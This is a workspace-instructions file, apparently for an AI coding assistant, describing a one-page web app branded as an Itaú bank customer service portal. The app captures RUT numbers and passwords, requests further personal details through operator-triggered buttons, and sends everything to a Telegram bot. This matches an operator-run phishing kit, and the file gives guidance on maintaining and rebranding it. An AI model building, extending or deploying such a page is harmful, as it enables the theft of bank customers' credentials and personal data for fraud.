# Workspace Instructions — Itaú Customer Service Portal

## Project Overview

A single-page web application (portal_2.html) providing an interactive customer service interface for Itaú bank. The portal:
- Handles user login via RUT (Chilean ID) and password
- Collects customer information via structured forms
- Integrates with Telegram bot API for message delivery
- Uses a warm, accessible design with Spanish language

**Technology:** HTML5 + vanilla JavaScript (no frameworks)
**Language:** Spanish (es) + some Portuguese terms
**Key Integration:** Telegram Bot API

## Key Configuration

All sensitive settings are in the `<script>` tag at the top of portal_2.html:
- `BOT_TOKEN`: Telegram bot authentication
- `CHAT_ID`: Target Telegram chat
- `API_KEY`: Application API key
- `COLOR_PRINCIPAL`: Brand color (#FF6200 - Itaú orange)
- `PORTAL_TITULO`, `PORTAL_SUBTITULO`, `FOOTER_TEXTO`: UI labels

**IMPORTANT:** Keep credentials in JS object at file top. Do not commit actual tokens—use placeholder format visible in file comments.

## Architecture & Flow

### Views (CSS classes, toggled by JS)
- **v-login**: Initial authentication screen (RUT + password)
- **v-wait**: Loading state during authentication
- **v-request**: Form to collect customer information
- **v-end**: Session completion screen

### Data Collection Buttons
Defined in `BOTONES` array. Each triggers:
- `req:*` - Request for specific info (phone, email, address, etc.)
- `custom:ask` - Allow customer to write custom request
- `end:session` - Finalize and send via Telegram

### Styling
- **Font:** Nunito (Google Fonts)
- **Colors:** Warm palette with #FF6200 primary (use CSS variable `--cp`
- **Responsive:** Flexbox-based, mobile-first design
- **Key classes:** `.login-card`, `.req-box`, `.ok-msg`, pulse animations

## Common Tasks

### Modify UI Text
Search for `PORTAL_TITULO`, `PORTAL_SUBTITULO`, `FOOTER_TEXTO` in the script block.

### Add/Remove Request Buttons
Edit the `BOTONES` array. Format:
```javascript
{text: '📱 Label', callback_data: 'req:field_name'}
```

### Change Brand Color
Update `COLOR_PRINCIPAL` constant. CSS automatically applies via `--cp` variable.

### Adjust Form Fields
Look for `.field` CSS class and `<input>` elements in respective view divs.

## Development Notes

- **No build step required** — file runs directly in browser
- **RUT formatting:** `formatRut()` function enforces Chilean ID format (##.###.###-#)
- **Password toggle:** `togglePass()` shows/hides sensitive input
- **All HTML/CSS/JS in one file** — keep structure organized by view

## Common Pitfalls

1. **Telegram API changes:** Bot token format or chat ID structure may vary by Telegram API version
2. **Credential exposure:** Keep tokens out of version control; use .env or secure vault in production
3. **Mobile viewport:** Always test on mobile; design is responsive but ensure touch targets are ≥48px
4. **Spanish localization:** Some labels are hardcoded; plan for i18n if adding other languages

---

**Quick Reference:** Run directly in browser; no server/build required. For Telegram integration testing, verify bot token and chat ID are active.
